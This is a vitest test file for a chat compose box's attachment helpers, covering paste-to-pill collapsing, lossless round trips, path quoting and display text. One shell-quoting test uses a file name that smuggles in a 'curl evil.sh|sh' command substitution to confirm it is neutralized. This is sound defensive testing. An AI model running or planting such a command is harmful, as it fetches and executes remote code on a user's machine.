import { describe, it, expect } from "vitest";
import {
  countLines,
  shouldPasteAsPill,
  isImagePath,
  basename,
  buildSendPayload,
  buildDisplay,
  rangeSelect,
  collapseText,
  composeBody,
  expandTextBlock,
  pillPreview,
  PILL_MIN_LINES,
  PILL_PREVIEW_CHARS,
  type Attachment,
  type TextBlock,
} from "./attachments";

const img = (over: Partial<Attachment> = {}): Attachment => ({
  id: "a1",
  kind: "image",
  path: "/tmp/shot.png",
  name: "shot.png",
  dataUrl: "data:image/png;base64,xxx",
  ...over,
});
const file = (over: Partial<Attachment> = {}): Attachment => ({
  id: "f1",
  kind: "file",
  path: "/tmp/notes.txt",
  name: "notes.txt",
  ...over,
});
const block = (text: string, id = "b1"): TextBlock => ({
  id,
  text,
  lineCount: countLines(text),
});

describe("countLines", () => {
  it("counts an empty string as zero lines", () => {
    expect(countLines("")).toBe(0);
  });
  it("counts a single line", () => {
    expect(countLines("hello")).toBe(1);
  });
  it("counts newline-separated lines", () => {
    expect(countLines("a\nb\nc")).toBe(3);
  });
  it("counts a trailing newline as an extra (empty) line", () => {
    expect(countLines("a\nb\n")).toBe(3);
  });
});

describe("shouldPasteAsPill", () => {
  it("is false for five lines or fewer", () => {
    expect(shouldPasteAsPill("1\n2\n3\n4\n5")).toBe(false);
  });
  it("is true for more than five lines (the threshold is six)", () => {
    expect(shouldPasteAsPill("1\n2\n3\n4\n5\n6")).toBe(true);
    expect(PILL_MIN_LINES).toBe(6);
  });
  it("is true for an enormous single-line paste (char threshold)", () => {
    expect(shouldPasteAsPill("x".repeat(2000))).toBe(true);
  });
  it("is false for an ordinary single line under the char threshold", () => {
    expect(shouldPasteAsPill("x".repeat(1999))).toBe(false);
  });
});

describe("pillPreview", () => {
  it("leads with the paste's own first words, so a pill is identifiable unopened", () => {
    expect(pillPreview("Concierge Reply Linter is up\nrest of the brief\nand more")).toBe(
      "Concierge Reply Linter is up",
    );
  });

  it("skips leading blank lines rather than showing an empty face", () => {
    // A brief pasted out of a chat window very often starts blank. Taking `split("\n")[0]`
    // would put nothing on the pill — the exact failure the preview exists to prevent.
    expect(pillPreview("\n\n   \nThe actual first line\nmore")).toBe("The actual first line");
  });

  it("flattens interior whitespace, because the face is one row of UI", () => {
    expect(pillPreview("a\t\tb   c\nsecond")).toBe("a b c");
  });

  it("elides past the budget and marks it, so a long line can't blow out the pill", () => {
    const preview = pillPreview("x".repeat(PILL_PREVIEW_CHARS + 40));
    expect(preview).toHaveLength(PILL_PREVIEW_CHARS);
    expect(preview.endsWith("…")).toBe(true);
  });

  it("is empty only when there is nothing but whitespace to show", () => {
    expect(pillPreview("\n\n  \n")).toBe("");
  });
});

describe("collapsing is lossless", () => {
  // The one failure that would silently corrupt a message: a surface transmitting the pill's
  // LABEL instead of its text. These rows are stated over the shared functions — the RULE, not
  // any one surface's wiring. They do NOT prove a given compose box calls them: each surface
  // owes its own end-to-end row at its own send boundary (Composer.collapsedPaste.test.tsx is
  // the build-agent composer's).
  const original =
    "Concierge Reply Linter is up\n\n  indented second line\ttabbed\n" +
    "line three\nline four\nline five\nline six\n\ntrailing blank above this\n";

  it("captures the paste byte for byte", () => {
    expect(collapseText("b1", original).text).toBe(original);
  });

  it("sends the FULL text, not the pill's label", () => {
    const sent = composeBody([collapseText("b1", original)], "");
    expect(sent).toBe(original);
    // And explicitly not the face the pill draws.
    expect(sent).not.toBe(pillPreview(original));
  });

  it("expand → SEND is byte-identical — the path the product actually has", () => {
    // THE REAL ROUND TRIP, and the one that was broken (roborev 55720). "Show as regular text"
    // moves the bytes out of the block and into the typed text; there is no re-collapse gesture
    // in the app, so this — not the re-collapse below — is what a user does. Trimming here
    // dedented a pasted diff and ate its trailing newline.
    const collapsed = collapseText("b1", original);
    const expanded = expandTextBlock("", collapsed);
    expect(expanded).toBe(original);
    expect(composeBody([], expanded, { verbatimTyped: true })).toBe(original);
  });

  it("…and the trim is what would have corrupted it, so the flag is doing real work", () => {
    // Pins the mechanism rather than restating the row above: without `verbatimTyped` this same
    // string comes back dedented and short its trailing newline. If this row ever stops
    // differing, the flag has become a no-op and the row above is passing vacuously.
    const expanded = expandTextBlock("", collapseText("b1", original));
    expect(composeBody([], expanded)).not.toBe(original);
    expect(composeBody([], expanded, { verbatimTyped: true })).toBe(original);
  });

  it("expand → collapse → send is byte-identical too", () => {
    // 1. Pasted: collapsed to a pill.
    const collapsed = collapseText("b1", original);
    // 2. "Show as regular text" in the modal: expanded back into an empty box.
    const expanded = expandTextBlock("", collapsed);
    // 3. Re-collapsed (the user pastes it again).
    const recollapsed = collapseText("b2", expanded);
    // 4. Sent.
    expect(composeBody([recollapsed], "")).toBe(original);
  });

  it("still trims text the user actually TYPED around a pill", () => {
    // The trim is right for a human's stray whitespace — `verbatimTyped` narrows it, it does not
    // remove it. (buildDisplay/buildSendPayload's existing rows pin the no-pill case.)
    expect(composeBody([collapseText("b1", original)], "  typed  ")).toBe(`${original}\n\ntyped`);
  });

  it("survives the same round trip through the build-agent composer's payload", () => {
    // buildSendPayload prefixes attachment paths, so assert the no-attachment case where the
    // payload IS the body — the guarantee is about the text, not the prefix.
    const collapsed = collapseText("b1", original);
    const once = buildSendPayload({ attachments: [], textBlocks: [collapsed], typed: "" });
    const again = buildSendPayload({
      attachments: [],
      textBlocks: [collapseText("b2", expandTextBlock("", collapsed))],
      typed: "",
    });
    expect(once).toBe(original);
    expect(again).toBe(original);
  });

  it("keeps a whitespace-only block, which `filter(Boolean)` must not eat", () => {
    // Six newlines clears PILL_MIN_LINES, so this really can become a block. Dropping it would
    // silently delete content the user pasted.
    const ws = "\n\n\n\n\n\n";
    expect(shouldPasteAsPill(ws)).toBe(true);
    expect(composeBody([collapseText("b1", ws)], "")).toBe(ws);
  });

  it("does not trim a block's own leading indentation", () => {
    // A pasted diff's indentation is content. Only the TYPED text is trimmed.
    const indented = "    line1\n    line2\n    line3\n    line4\n    line5\n    line6";
    expect(composeBody([collapseText("b1", indented)], "  typed  ")).toBe(`${indented}\n\ntyped`);
  });

  it("orders blocks before the typed text, blank-line separated", () => {
    expect(composeBody([collapseText("b1", "A"), collapseText("b2", "B")], "C")).toBe("A\n\nB\n\nC");
  });
});

describe("expandTextBlock", () => {
  it("into an empty box is exactly the block's text", () => {
    expect(expandTextBlock("", block("a\nb"))).toBe("a\nb");
  });

  it("appends on its own line when the box already has words", () => {
    expect(expandTextBlock("hi", block("a\nb"))).toBe("hi\na\nb");
  });

  it("does not double the newline when the box already ends in one", () => {
    expect(expandTextBlock("hi\n", block("a"))).toBe("hi\na");
  });
});

describe("isImagePath", () => {
  it("recognizes common image extensions case-insensitively", () => {
    for (const p of ["a.png", "b.JPG", "c.jpeg", "d.gif", "e.webp", "f.bmp"]) {
      expect(isImagePath(p)).toBe(true);
    }
  });
  it("rejects non-image files", () => {
    for (const p of ["a.txt", "b.pdf", "c", "d.png.zip", "notes"]) {
      expect(isImagePath(p)).toBe(false);
    }
  });
  it("rejects HEIC (WebView can't render it as a preview)", () => {
    expect(isImagePath("photo.heic")).toBe(false);
    expect(isImagePath("photo.HEIC")).toBe(false);
  });
});

describe("basename", () => {
  it("returns the final path segment", () => {
    expect(basename("/tmp/sub/shot.png")).toBe("shot.png");
    expect(basename("shot.png")).toBe("shot.png");
    expect(basename("/trailing/")).toBe("trailing");
  });
});

describe("buildSendPayload", () => {
  it("prefixes attachment paths, then expands pills and typed text inline", () => {
    const payload = buildSendPayload({
      attachments: [img({ path: "/tmp/a.png" }), file({ path: "/tmp/n.txt" })],
      textBlocks: [block("line1\nline2\nline3\nline4\nline5\nline6")],
      typed: "please review",
    });
    expect(payload).toBe(
      "/tmp/a.png /tmp/n.txt line1\nline2\nline3\nline4\nline5\nline6\n\nplease review",
    );
  });
  it("works with only typed text", () => {
    expect(buildSendPayload({ attachments: [], textBlocks: [], typed: "hi" })).toBe("hi");
  });
  it("works with only a pill (no typed text)", () => {
    expect(
      buildSendPayload({ attachments: [], textBlocks: [block("a\nb")], typed: "" }),
    ).toBe("a\nb");
  });
  it("works with only attachments", () => {
    expect(
      buildSendPayload({ attachments: [img({ path: "/tmp/a.png" })], textBlocks: [], typed: "" }),
    ).toBe("/tmp/a.png");
  });
  it("trims surrounding whitespace on typed text", () => {
    expect(buildSendPayload({ attachments: [], textBlocks: [], typed: "  hey  " })).toBe("hey");
  });
  it("quotes attachment paths that contain spaces so they stay one token", () => {
    expect(
      buildSendPayload({
        attachments: [img({ path: "/Users/me/My Photos/a.png" })],
        textBlocks: [],
        typed: "look",
      }),
    ).toBe("'/Users/me/My Photos/a.png' look");
  });
  it("leaves plain paths unquoted", () => {
    expect(
      buildSendPayload({ attachments: [img({ path: "/tmp/a.png" })], textBlocks: [], typed: "" }),
    ).toBe("/tmp/a.png");
  });
  it("neutralizes shell metacharacters — this payload can reach a live shell tab", () => {
    // `kind: "shell"` is a valid compose-box target and submitPrompt appends the carriage return
    // itself, so a name like this used to RUN with no user Enter (roborev 54375). The rule is
    // services/shellQuote; this asserts buildSendPayload applies it.
    expect(
      buildSendPayload({
        attachments: [img({ path: "/tmp/report`curl evil.sh|sh`.png" })],
        textBlocks: [],
        typed: "look",
      }),
    ).toBe("'/tmp/report`curl evil.sh|sh`.png' look");
  });
  it("escapes an embedded single quote by closing, escaping and reopening", () => {
    expect(
      buildSendPayload({
        attachments: [img({ path: "/tmp/don't.png" })],
        textBlocks: [],
        typed: "",
      }),
    ).toBe("'/tmp/don'\\''t.png'");
  });
  it("quotes a path containing a quote even with no whitespace", () => {
    expect(
      buildSendPayload({ attachments: [img({ path: '/tmp/a"b.png' })], textBlocks: [], typed: "" }),
    ).toBe(`'/tmp/a"b.png'`);
  });
});

describe("buildDisplay", () => {
  it("summarizes pills and attachments without leaking temp paths", () => {
    const display = buildDisplay({
      attachments: [img(), img({ id: "a2" }), file()],
      textBlocks: [block("a\nb\nc\nd\ne\nf")],
      typed: "ship it",
    });
    expect(display).toContain("ship it");
    expect(display).toContain("📄 1 text block");
    expect(display).toContain("📷 2 images");
    expect(display).toContain("📎 1 file");
    expect(display).not.toContain("/tmp");
  });
  it("is just the typed text when nothing is attached", () => {
    expect(buildDisplay({ attachments: [], textBlocks: [], typed: "hello" })).toBe("hello");
  });
  it("singularizes counts", () => {
    const display = buildDisplay({
      attachments: [img()],
      textBlocks: [block("a\nb")],
      typed: "",
    });
    expect(display).toContain("📄 1 text block");
    expect(display).toContain("📷 1 image");
    expect(display).not.toContain("images");
    expect(display).not.toContain("blocks");
  });
});

describe("rangeSelect", () => {
  const ids = ["a", "b", "c", "d", "e"];
  it("selects a forward contiguous range inclusive of both ends", () => {
    expect(rangeSelect(ids, "b", "d")).toEqual(["b", "c", "d"]);
  });
  it("selects a backward range (anchor after target)", () => {
    expect(rangeSelect(ids, "d", "b")).toEqual(["b", "c", "d"]);
  });
  it("returns a single id when anchor equals target", () => {
    expect(rangeSelect(ids, "c", "c")).toEqual(["c"]);
  });
  it("falls back to just the target when the anchor is unknown", () => {
    expect(rangeSelect(ids, "zzz", "c")).toEqual(["c"]);
  });
});
